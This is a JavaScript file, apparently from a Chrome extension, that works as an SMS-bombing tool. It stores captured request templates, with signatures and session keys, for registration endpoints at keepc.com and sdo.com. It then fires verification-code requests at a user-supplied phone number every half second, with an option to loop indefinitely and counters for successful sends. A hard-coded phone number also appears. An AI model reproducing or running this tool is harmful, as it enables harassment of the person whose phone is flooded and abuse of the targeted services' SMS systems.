var aweb = [
  {
    path: 'http://www.keepc.com',
    url: 'http://www.keepc.com/regMobile.act',
    type: 'POST',
    data: {
      zmobile$mobile: '13122948751',
      sign:'d277861f2623ad447394ab8e59a7bdc4767e43bae65dbcf29b32171ca24d79b10523459cd907bead97b70dbab78d629cc88515871b95',
      authCode:'y3wc',
      psystem:'web'
    }
  },
  {
    path: 'https://reguser.sdo.com',
    url: 'https://reguser.sdo.com/user/register/confirm-needed-mobile.jsonp',
    type: 'GET',
    data: {
      zmobile$mobile: '13122948751',
      callback: 'jQuery18203769611989499806_1466070604894',
      sessionKey: 'UBduqvAV2fCMwNOF',
      appId: '201',
      areaId: '-1',
      backUrl: 'http%3A%2F%2Fwww.sdo.com',
      _: '1466070622037'
    }
  }
];

var spaceTime =null;


// 发送成功次数
var success = 0;

// 发送失败次数
var failure = 0;

// 发送总次数
var total = 0;

// 当前下标
var num = 0;

// 最大下标
var numMax = aweb.length;

// 是否一直循环发送
var isRound = false;


var oTxt,oTime,oBtn,oStop,oRound;

document.addEventListener('DOMContentLoaded',function(){
  // 插件html加载完成
  var str = "";
  /*chrome.tabs.getSelected(null,function(tab) {
    // 点击icon会自动触发该方法
    // str = tab.url;
    // sendSms(str);
  });*/
  oTxt = jQuery("#inputTxt");
  oTime = jQuery("#inputTime");
  oStop = jQuery("#stopBtn");
  oRound = jQuery("#roundBtn");
  oBtn = jQuery("#inputBtn");
  oTxt.keyup(function(event){
    if(event.which == 13){
      isCreate();
    }
  });
  oBtn.on("click", function(){
    isRound = false;
    isCreate();
  });
  oStop.on("click",function(){
    isRound = false;
    if(spaceTime){
      clearInterval(spaceTime);
    }
  });
  oRound.on("click", function(){
    isRound = true;
    isCreate();
  });

  // 日志
  jQuery(".log_title").on('click', function(){
    console.log(jQuery(".log_list").hasClass('show'));
    if(jQuery(".log_list").hasClass('show')){
      jQuery(".log_list").removeClass("show");
    }else{
      jQuery(".log_list").addClass("show");
    }
  });

});


function isCreate(){
  if(!oTxt.val() || oTxt.val() == ''){
    alert("请填写号码");
    return;
  }
  if(spaceTime){
    clearInterval(spaceTime);
  }
  var space = oTime.val()*60*1000 || 5*60*1000;
  
  sendSms(aweb[num], oTxt.val());

  spaceTime = setInterval(function(){
    if(num == numMax){
      num = 0;
      if(!isRound){
        clearInterval(spaceTime);
        return;
      }
    }
    sendSms(aweb[num], oTxt.val());
  }, 500);
  
  // if(oTxt.val()){
  //   jQuery('#qrcodeTable').html("");
  //   sendSms(oTxt.val());
  // }
}


function sendSms(item, phone){
  num ++;
  total++;
  console.log(num);
  var url = item.url;
  var type = item.type;
  var data = item.data;
  $.each(data, function(subkey, subval){
      if(subkey.indexOf('zmobile$') >= 0){
          var mobile = subkey.split('$')[1];
          var phone_num = phone || subval;
          data[mobile] = phone_num;
          delete data[subkey];
      }
  });
  // console.log(data);
  var isError = false;
  $.ajax({
      url: url,
      type: type,
      data: data,
      dataType: "json",
      success: function (t) {
        isError = false;
        success++;
        console.log('发送成功');
      },
      error: function () {
        failure++;
        isError = true;
        console.log('发送失败');
      },
      complete: function(){
        jQuery('#qrcodeTable').html("成功"+success +'； 失败'+failure+'； 共发送'+total+'次');
        log(url, data, isError);
      }
  });

}



// 日志
function log(url, data, isError){
  var str = url || '';
  var arr = [];
  jQuery.each(data, function(key, val){
    arr.push(key +'='+val);
  });
  str = str + '?' + arr.join('&');
  if(isError){
    var oli = $('<li class="error">'+str+'</li>');
  }else{
    var oli = $('<li>'+str+'</li>');
  }
  jQuery(".log_list").append(oli);
}